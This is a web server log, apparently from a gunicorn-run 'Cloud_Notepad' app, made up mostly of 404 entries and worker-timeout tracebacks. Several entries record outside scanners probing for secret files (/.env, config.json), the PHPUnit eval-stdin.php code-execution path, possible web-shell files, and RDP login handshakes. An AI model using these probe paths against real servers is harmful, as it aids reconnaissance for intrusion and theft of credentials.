+Not Found: /info/10801/111223.htm
+Not Found: /info/10801/111093.htm
+Not Found: /info/10801/110953.htm
+Not Found: /info/10801/110923.htm
+Not Found: /index/xsdt.htm
+Not Found: /info/11050/111323.htm
+Not Found: /info/11050/111243.htm
+Not Found: /info/11050/111233.htm
+Not Found: /info/11050/111213.htm
+Not Found: /info/11050/111143.htm
+Not Found: /info/11050/111063.htm
+Not Found: /info/11050/110933.htm
+Not Found: /info/11050/110773.htm
+Not Found: /info/11050/110613.htm
+Not Found: /info/11050/110603.htm
+Not Found: /info/11050/110553.htm
+Not Found: /info/11050/110413.htm
+Not Found: /info/11050/110343.htm
+Not Found: /info/11050/110223.htm
+Not Found: /info/11050/110143.htm
+Not Found: /info/11050/110103.htm
+Not Found: /info/11050/109863.htm
+Not Found: /info/11050/109693.htm
+Not Found: /index/tzgg.htm
+Not Found: /info/11049/105092.htm
+Not Found: /info/11049/103731.htm
+Not Found: /info/11049/103342.htm
+Not Found: /index/mtdd.htm
+Not Found: /info/10800/111293.htm
+Not Found: /info/10800/111293.htm
+Not Found: /info/10800/111263.htm
+Not Found: /info/10800/111253.htm
+Not Found: /index/mtdd.htm
+Not Found: /info/10800/111193.htm
+Not Found: /index/mtdd.htm
+Not Found: /info/10800/111183.htm
+Not Found: /index/mtdd.htm
+Not Found: /info/10800/111173.htm
+Not Found: /index/mtdd.htm
+Not Found: /info/10800/111163.htm
+Not Found: /index/mtdd.htm
+Not Found: /info/10800/111123.htm
+Not Found: /index/ldsr.htm
+Not Found: /info/10802/105482.htm
+Not Found: /info/10802/111303.htm
+Not Found: /info/10802/111133.htm
+Not Found: /info/10802/111073.htm
+Not Found: /xzxx.htm
+Not Found: /index/zhuantijujia.htm
+Not Found: /zsjy.htm
+Not Found: /wsxf.htm
+Not Found: /bgdh/cydh.htm
+Not Found: /xxgk/lxwm.htm
+Not Found: /xxgk.htm
+Not Found: /xxgk.htm
+Not Found: /xxgk/fzzl.htm
+Not Found: /xxgk/lsyg.htm
+Not Found: /xxgk/xrld.htm
+Not Found: /xxgk/lrld.htm
+Not Found: /xxgk/ldtc.htm
+Not Found: /xxgk/xydy.htm
+Not Found: /xxgk/xyfj.htm
+Not Found: /xxgk/xqtj.htm
+Not Found: /xxgk/lxwm.htm
+Not Found: /zzjg1.htm
+Not Found: /zzjg1/jxkyjg.htm
+Not Found: /zzjg1/glfwjg.htm
+Not Found: /jyjx1.htm
+Not Found: /szdw1.htm
+Not Found: /szdw1/zxys.htm
+Not Found: /szdw1/jcrc.htm
+Not Found: /szdw1/jxms.htm
+Not Found: /xkjs1.htm
+Not Found: /xkjs1/zdxk.htm
+Not Found: /xkjs1/bkzysz.htm
+Not Found: /xkjs1/syssxwxk.htm
+Not Found: /xkjs1/sybsxwxk.htm
+Not Found: /xkjs1/sszyxwsqlb.htm
+Not Found: /xkjs1/bszyxwsqlb.htm
+Not Found: /xkjs1/zzszejjcxk.htm
+Not Found: /kxyj1.htm
+Not Found: /kxyj1/gjjkypt.htm
+Not Found: /kxyj1/sbjkypt.htm
+Not Found: /zsjy.htm
+Not Found: /cbgz1.htm
+Not Found: /xyzj1.htm
+Not Found: /favicon.ico
+Not Found: /v1/models
+[2025-06-04 20:39:42 +0800] [1346592] [WARNING] Invalid request from ip=194.180.48.197: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-04 21:40:21 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1346592)
+[2025-06-04 21:40:21 +0800] [1346592] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-04 21:40:21 +0800] [1346592] [INFO] Worker exiting (pid: 1346592)
+[2025-06-04 21:40:21 +0800] [1413925] [INFO] Booting worker with pid: 1413925
+Not Found: /systembc/password.php
+Not Found: /password.php
+Not Found: /form.html
+Not Found: /1.php
+Not Found: /upl.php
+Not Found: /t4
+Not Found: /geoip/
+[2025-06-04 23:02:58 +0800] [1413925] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /.env
+[2025-06-05 00:55:25 +0800] [1413925] [WARNING] Invalid request from ip=88.214.25.125: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-05 01:29:48 +0800] [1413925] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /version
+Not Found: /v1
+[2025-06-05 03:50:25 +0800] [1413925] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /ping.js
+Not Found: /hlslive-tx-cdn.ysp.cctv.cn/ysp/2024078202.m3u8
+Not Found: /hlslive-tx-cdn.ysp.cctv.cn/ysp/2024078201.m3u8
+Not Found: /hlslive-tx-cdn.ysp.cctv.cn/ysp/2024078203.m3u8
+Not Found: /robots.txt
+Not Found: /sdk
+Not Found: /odinhttpcall1749073930
+Not Found: /evox/about
+Not Found: /HNAP1
+Not Found: /v1/models
+[2025-06-05 08:17:06 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1413925)
+[2025-06-05 08:17:06 +0800] [1413925] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-05 08:17:06 +0800] [1413925] [INFO] Worker exiting (pid: 1413925)
+[2025-06-05 08:17:06 +0800] [1609947] [INFO] Booting worker with pid: 1609947
+Not Found: /favicon.ico
+Not Found: /portal/redlion
+Not Found: /favicon.ico
+[2025-06-05 10:08:55 +0800] [1609947] [WARNING] Invalid request from ip=121.41.165.24: Invalid HTTP request line: ''
+Not Found: /sdk
+Not Found: /nmaplowercheck1749089339
+Not Found: /evox/about
+Not Found: /nmaplowercheck1749089339
+Not Found: /HNAP1
+Not Found: /nmaplowercheck1749089367
+Not Found: /sdk
+Not Found: /HNAP1
+Not Found: /evox/about
+[2025-06-05 10:31:36 +0800] [1609947] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-05 11:08:02 +0800] [1609947] [WARNING] Invalid request from ip=45.142.193.132: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /api/client/update
+[2025-06-05 15:03:42 +0800] [1609947] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-05 15:08:45 +0800] [1609947] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-05 15:32:28 +0800] [1609947] [WARNING] Invalid request from ip=3.132.23.201: Invalid HTTP request line: 'SSH-2.0-Go'
+[2025-06-05 16:00:16 +0800] [1609947] [WARNING] Invalid request from ip=45.142.193.132: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-05 17:01:43 +0800] [1609947] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-05 17:26:41 +0800] [1609947] [WARNING] Invalid request from ip=80.94.95.64: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-05 17:58:08 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1609947)
+[2025-06-05 17:58:08 +0800] [1609947] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-05 17:58:08 +0800] [1609947] [INFO] Worker exiting (pid: 1609947)
+[2025-06-05 17:58:08 +0800] [1789049] [INFO] Booting worker with pid: 1789049
+Not Found: /mobilelive-play.ysp.cctv.cn/ysp/2013693901.m3u8
+Not Found: /json/
+Not Found: /443
+[2025-06-05 18:20:46 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1789049)
+[2025-06-05 18:20:46 +0800] [1789049] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-05 18:20:46 +0800] [1789049] [INFO] Worker exiting (pid: 1789049)
+[2025-06-05 18:20:46 +0800] [1795995] [INFO] Booting worker with pid: 1795995
+[2025-06-05 18:21:17 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1795995)
+[2025-06-05 18:21:17 +0800] [1795995] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-05 18:21:17 +0800] [1795995] [INFO] Worker exiting (pid: 1795995)
+[2025-06-05 18:21:17 +0800] [1796169] [INFO] Booting worker with pid: 1796169
+Not Found: /public/stylesheets/theme.css
+Not Found: /customer/js/lang_zh_tw.js
+Not Found: /index.php
+Not Found: /public/stylesheets/theme.css
+Not Found: /login/stylesheets/theme.css
+Not Found: /customer/js/lang_zh_tw.js
+Not Found: /login/stylesheets/theme.css
+Not Found: /ips/index.php
+Not Found: /chs/js/lang_zh_tw.js
+Not Found: /index.php
+Not Found: /chs/js/lang_zh_tw.js
+Not Found: /index.php
+Not Found: /ips/index.php
+Not Found: /index.php
+Not Found: /stylesheets/theme.css
+Not Found: /stylesheets/theme.css
+Not Found: /api/v2/heartbeat
+[2025-06-05 21:31:21 +0800] [1796169] [WARNING] Invalid request from ip=178.159.37.112: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /v1/models
+Not Found: /GXNo
+Not Found: /8nIn
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /favicon.ico
+Not Found: /443
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /developmentserver/metadatauploader
+Not Found: /druid/index.html
+Not Found: /security.txt
+Not Found: /favicon.ico
+[2025-06-06 01:35:40 +0800] [1796169] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-06-06 01:35:40 +0800] [1796169] [INFO] Worker exiting (pid: 1796169)
+[2025-06-06 01:35:40 +0800] [3846911] [ERROR] Worker (pid:1796169) exited with code 255
+[2025-06-06 01:35:40 +0800] [3846911] [ERROR] Worker (pid:1796169) exited with code 255.
+[2025-06-06 01:35:40 +0800] [1929822] [INFO] Booting worker with pid: 1929822
+Not Found: /favicon.ico
+[2025-06-06 01:36:41 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1929822)
+[2025-06-06 01:36:41 +0800] [1929822] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-06 01:36:41 +0800] [1929822] [INFO] Worker exiting (pid: 1929822)
+[2025-06-06 01:36:41 +0800] [1930130] [INFO] Booting worker with pid: 1930130
+Not Found: /.well-known/security.txt
+[2025-06-06 01:41:49 +0800] [1930130] [WARNING] Invalid request from ip=31.7.62.234: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /ReportServer
+[2025-06-06 03:42:55 +0800] [1930130] [WARNING] Invalid request from ip=178.159.37.112: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-06 04:14:34 +0800] [1930130] [WARNING] Invalid request from ip=194.165.16.166: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-06 04:54:38 +0800] [1930130] [WARNING] Invalid request from ip=180.76.226.196: Invalid HTTP request line: ''
+Not Found: /nice ports,/Trinity.txt.bak
+[2025-06-06 04:54:47 +0800] [1930130] [WARNING] Invalid request from ip=180.76.226.196: Invalid HTTP method: '\x05\x04\x00\x01\x02\x80\x05\x01\x00\x03\ngoogle.com\x00PGET'
+[2025-06-06 04:54:57 +0800] [1930130] [WARNING] Invalid request from ip=180.76.226.196: Invalid HTTP Version: 'RTSP/1.0'
+[2025-06-06 04:55:13 +0800] [1930130] [WARNING] Invalid request from ip=180.76.226.196: Invalid HTTP request line: 'HELP'
+[2025-06-06 04:55:38 +0800] [1930130] [WARNING] Invalid request from ip=180.76.226.196: Invalid HTTP Version: 'SIP/2.0'
+[2025-06-06 05:25:13 +0800] [1930130] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /cgi-bin/luci/
+Not Found: /actuator/health
+[2025-06-06 06:22:11 +0800] [1930130] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /geoserver/web/
+Not Found: /actuator/gateway/routes
+Not Found: /geoserver
+Not Found: /webui/
+Not Found: /.env
+[2025-06-06 12:48:56 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1930130)
+[2025-06-06 12:48:56 +0800] [1930130] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 269, in parse
+    self.get_data(unreader, buf, stop=True)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-06 12:48:56 +0800] [1930130] [INFO] Worker exiting (pid: 1930130)
+[2025-06-06 12:48:56 +0800] [2137403] [INFO] Booting worker with pid: 2137403
+[2025-06-06 12:49:27 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:2137403)
+[2025-06-06 12:49:27 +0800] [2137403] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-06 12:49:27 +0800] [2137403] [INFO] Worker exiting (pid: 2137403)
+[2025-06-06 12:49:28 +0800] [2137576] [INFO] Booting worker with pid: 2137576
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /config.json
+[2025-06-06 12:49:38 +0800] [2137576] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /hello.world
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
+Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
